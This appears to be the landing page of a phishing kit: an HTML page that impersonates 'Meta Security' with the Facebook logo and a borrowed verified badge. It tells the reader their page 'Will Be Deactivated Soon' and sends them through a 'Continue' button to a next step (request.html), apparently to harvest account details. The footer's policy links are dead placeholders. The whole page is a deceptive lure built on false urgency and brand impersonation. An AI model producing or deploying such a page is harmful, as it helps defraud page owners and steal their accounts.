<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Meta Security Notice</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: white;
      padding: 20px;
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .meta-header {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }

    .meta-logo {
      width: 40px;
      height: 40px;
      margin-right: 10px;
    }

    .meta-text {
      flex: 1;
    }

    .title {
      font-weight: bold;
      font-size: 18px;
    }

    .sub-title {
      font-size: 14px;
      color: gray;
      display: flex;
      align-items: center;
      gap: 5px;
    }

    .tick {
      width: 14px;
      height: 14px;
    }

    .warning {
      color: red;
      font-weight: bold;
      font-size: 16px;
      margin-bottom: 15px;
      text-align: center;
    }

    .message {
      font-size: 14px;
      margin-bottom: 20px;
      text-align: center;
    }

    /* Style link like a button */
    .button-link {
      background-color: #1877f2;
      color: white;
      padding: 12px 20px;
      font-size: 14px;
      border-radius: 5px;
      cursor: pointer;
      display: inline-block;
      width: 100%;
      text-align: center;
      text-decoration: none;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: gray;
      text-align: center;
    }

    .footer a {
      color: gray;
      text-decoration: none;
      margin: 0 4px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="meta-header">
      <img class="meta-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
      <div class="meta-text">
        <div class="title">Meta Security</div>
        <div class="sub-title">
          Account Restrictions Service 
          <img class="tick" src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" alt="Verified">
        </div>
      </div>
    </div>

    <div class="warning">Your Page Will Be Deactivated Soon</div>
    <div class="message">
      We will walk you through several steps to request a review. You should complete these steps so that your page will not be deleted permanently.
    </div>

    <!-- Button as a link -->
    <a href="request.html" class="button-link">Continue</a>

    <div class="footer">
      <a href="#">Terms of Service</a> |
      <a href="#">Privacy Policy</a> |
      <a href="#">Community Standards</a> |
      <a href="#">Help Center</a>
    </div>
  </div>
</body>
</html>
